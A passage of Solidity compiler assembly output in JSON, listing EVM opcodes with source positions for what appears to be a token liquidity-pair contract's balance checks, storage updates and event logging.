											"begin": 8553,
											"end": 8560,
											"name": "DUP11"
										},
										{
											"begin": 8553,
											"end": 8564,
											"name": "GT"
										},
										{
											"begin": 8538,
											"end": 8564,
											"name": "tag",
											"value": "239"
										},
										{
											"begin": 8538,
											"end": 8564,
											"name": "JUMPDEST"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "PUSH [tag]",
											"value": "240"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "JUMPI"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "DUP2"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "MSTORE"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "ADD"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "DUP1"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "DUP1"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "ADD"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "DUP3"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "DUP2"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "SUB"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "DUP3"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "MSTORE"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "DUP2"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "MSTORE"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "ADD"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "DUP1"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "PUSH data",
											"value": "6C050B0A8D3F2D18D11271EE0A551B7748437B8FA9A6165C561190D34A2947D6"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "SWAP2"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "CODECOPY"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "ADD"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "SWAP2"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "POP"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "POP"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "MLOAD"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "DUP1"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "SWAP2"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "SUB"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "SWAP1"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "REVERT"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "tag",
											"value": "240"
										},
										{
											"begin": 8517,
											"end": 8628,
											"name": "JUMPDEST"
										},
										{
											"begin": 8638,
											"end": 8669,
											"name": "PUSH [tag]",
											"value": "241"
										},
										{
											"begin": 8652,
											"end": 8656,
											"name": "ADDRESS"
										},
										{
											"begin": 8659,
											"end": 8668,
											"name": "DUP5"
										},
										{
											"begin": 8638,
											"end": 8643,
											"name": "PUSH [tag]",
											"value": "242"
										},
										{
											"begin": 8638,
											"end": 8669,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8638,
											"end": 8669,
											"name": "tag",
											"value": "241"
										},
										{
											"begin": 8638,
											"end": 8669,
											"name": "JUMPDEST"
										},
										{
											"begin": 8679,
											"end": 8714,
											"name": "PUSH [tag]",
											"value": "243"
										},
										{
											"begin": 8693,
											"end": 8700,
											"name": "DUP8"
										},
										{
											"begin": 8702,
											"end": 8704,
											"name": "DUP14"
										},
										{
											"begin": 8706,
											"end": 8713,
											"name": "DUP14"
										},
										{
											"begin": 8679,
											"end": 8692,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 8679,
											"end": 8714,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8679,
											"end": 8714,
											"name": "tag",
											"value": "243"
										},
										{
											"begin": 8679,
											"end": 8714,
											"name": "JUMPDEST"
										},
										{
											"begin": 8724,
											"end": 8759,
											"name": "PUSH [tag]",
											"value": "244"
										},
										{
											"begin": 8738,
											"end": 8745,
											"name": "DUP7"
										},
										{
											"begin": 8747,
											"end": 8749,
											"name": "DUP14"
										},
										{
											"begin": 8751,
											"end": 8758,
											"name": "DUP13"
										},
										{
											"begin": 8724,
											"end": 8737,
											"name": "PUSH [tag]",
											"value": "142"
										},
										{
											"begin": 8724,
											"end": 8759,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8724,
											"end": 8759,
											"name": "tag",
											"value": "244"
										},
										{
											"begin": 8724,
											"end": 8759,
											"name": "JUMPDEST"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "DUP1"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "DUP2"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "MSTORE"
										},
										{
											"begin": 8814,
											"end": 8818,
											"name": "ADDRESS"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "DUP3"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "ADD"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "MSTORE"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "SWAP1"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 8780,
											"end": 8805,
											"name": "DUP10"
										},
										{
											"begin": 8780,
											"end": 8805,
											"name": "AND"
										},
										{
											"begin": 8780,
											"end": 8805,
											"name": "SWAP2"
										},
										{
											"begin": 8780,
											"end": 8805,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 8780,
											"end": 8805,
											"name": "SWAP2"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "DUP1"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "DUP4"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "ADD"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "SWAP3"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "SWAP3"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "SWAP2"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "SWAP1"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "DUP3"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "SWAP1"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "SUB"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "ADD"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "DUP2"
										},
										{
											"begin": 8780,
											"end": 8805,
											"name": "DUP7"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "DUP1"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "245"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "245"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "POP"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "GAS"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "STATICCALL"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "246"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "246"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "POP"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "POP"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "POP"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "POP"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "MLOAD"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "247"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "247"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "MLOAD"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "DUP1"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "DUP2"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "MSTORE"
										},
										{
											"begin": 8875,
											"end": 8879,
											"name": "ADDRESS"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "DUP3"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "ADD"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "MSTORE"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "SWAP1"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "MLOAD"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "SWAP2"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "SWAP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 8841,
											"end": 8866,
											"name": "DUP9"
										},
										{
											"begin": 8841,
											"end": 8866,
											"name": "AND"
										},
										{
											"begin": 8841,
											"end": 8866,
											"name": "SWAP2"
										},
										{
											"begin": 8841,
											"end": 8866,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 8841,
											"end": 8866,
											"name": "SWAP2"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "DUP1"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "DUP3"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "ADD"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "SWAP3"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8780,
											"end": 8820,
											"name": "SWAP3"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "SWAP1"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "SWAP2"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "SWAP1"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "DUP3"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "SWAP1"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "SUB"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "ADD"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "DUP2"
										},
										{
											"begin": 8841,
											"end": 8866,
											"name": "DUP7"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "DUP1"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "248"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "248"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "POP"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "GAS"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "STATICCALL"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "249"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "249"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "POP"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "POP"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "POP"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "POP"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "MLOAD"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "250"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "250"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "MLOAD"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8892,
											"end": 8941,
											"name": "PUSH [tag]",
											"value": "251"
										},
										{
											"begin": 8900,
											"end": 8908,
											"name": "DUP6"
										},
										{
											"begin": 8841,
											"end": 8881,
											"name": "DUP6"
										},
										{
											"begin": 8920,
											"end": 8929,
											"name": "DUP12"
										},
										{
											"begin": 8931,
											"end": 8940,
											"name": "DUP12"
										},
										{
											"begin": 8892,
											"end": 8899,
											"name": "PUSH [tag]",
											"value": "179"
										},
										{
											"begin": 8892,
											"end": 8941,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8892,
											"end": 8941,
											"name": "tag",
											"value": "251"
										},
										{
											"begin": 8892,
											"end": 8941,
											"name": "JUMPDEST"
										},
										{
											"begin": 8955,
											"end": 8960,
											"name": "DUP2"
										},
										{
											"begin": 8951,
											"end": 8998,
											"name": "ISZERO"
										},
										{
											"begin": 8951,
											"end": 8998,
											"name": "PUSH [tag]",
											"value": "252"
										},
										{
											"begin": 8951,
											"end": 8998,
											"name": "JUMPI"
										},
										{
											"begin": 8989,
											"end": 8997,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 8989,
											"end": 8997,
											"name": "SLOAD"
										},
										{
											"begin": 8970,
											"end": 8998,
											"name": "PUSH [tag]",
											"value": "253"
										},
										{
											"begin": 8970,
											"end": 8998,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 8975,
											"end": 8983,
											"name": "DUP1"
										},
										{
											"begin": 8975,
											"end": 8983,
											"name": "DUP3"
										},
										{
											"begin": 8975,
											"end": 8983,
											"name": "AND"
										},
										{
											"begin": 8975,
											"end": 8983,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8989,
											"end": 8997,
											"name": "SWAP1"
										},
										{
											"begin": 8989,
											"end": 8997,
											"name": "DIV"
										},
										{
											"begin": 8989,
											"end": 8997,
											"name": "AND"
										},
										{
											"begin": 8970,
											"end": 8998,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 8970,
											"end": 8988,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 8970,
											"end": 8998,
											"name": "AND"
										},
										{
											"begin": 8970,
											"end": 8998,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8970,
											"end": 8998,
											"name": "tag",
											"value": "253"
										},
										{
											"begin": 8970,
											"end": 8998,
											"name": "JUMPDEST"
										},
										{
											"begin": 8962,
											"end": 8967,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 8962,
											"end": 8998,
											"name": "SSTORE"
										},
										{
											"begin": 8951,
											"end": 8998,
											"name": "tag",
											"value": "252"
										},
										{
											"begin": 8951,
											"end": 8998,
											"name": "JUMPDEST"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "DUP1"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "MLOAD"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "DUP13"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "DUP2"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "MSTORE"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "DUP2"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "ADD"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "DUP13"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "SWAP1"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "MSTORE"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "DUP2"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "DUP16"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "AND"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "SWAP3"
										},
										{
											"begin": 9058,
											"end": 9068,
											"name": "CALLER"
										},
										{
											"begin": 9058,
											"end": 9068,
											"name": "SWAP3"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "PUSH",
											"value": "DCCD412F0B1252819CB1FD330B93224CA42612892BB3F4F789976E6D81936496"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "SWAP3"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "SWAP1"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "DUP2"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "SWAP1"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "SUB"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "SWAP1"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "SWAP2"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "ADD"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "SWAP1"
										},
										{
											"begin": 9053,
											"end": 9091,
											"name": "LOG3"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 1244,
											"end": 1245,
											"name": "POP"
										},
										{
											"begin": 1266,
											"end": 1267,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1255,
											"end": 1263,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1255,
											"end": 1267,
											"name": "DUP2"
										},
										{
											"begin": 1255,
											"end": 1267,
											"name": "SWAP1"
										},
										{
											"begin": 1255,
											"end": 1267,
											"name": "SSTORE"
										},
										{
											"begin": 1255,
											"end": 1267,
											"name": "POP"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SWAP2"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "POP"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SWAP2"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "tag",
											"value": "96"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "JUMPDEST"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "AND"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "DUP2"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "tag",
											"value": "98"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMPDEST"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MLOAD"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP1"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "ADD"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP1"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "6"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "ADD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "4B42432D4C5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "D4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "MSTORE"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "POP"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "DUP2"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "tag",
											"value": "105"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMPDEST"
										},
										{
											"begin": 3026,
											"end": 3030,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3042,
											"end": 3074,
											"name": "PUSH [tag]",
											"value": "182"
										},
										{
											"begin": 3052,
											"end": 3062,
											"name": "CALLER"
										},
										{
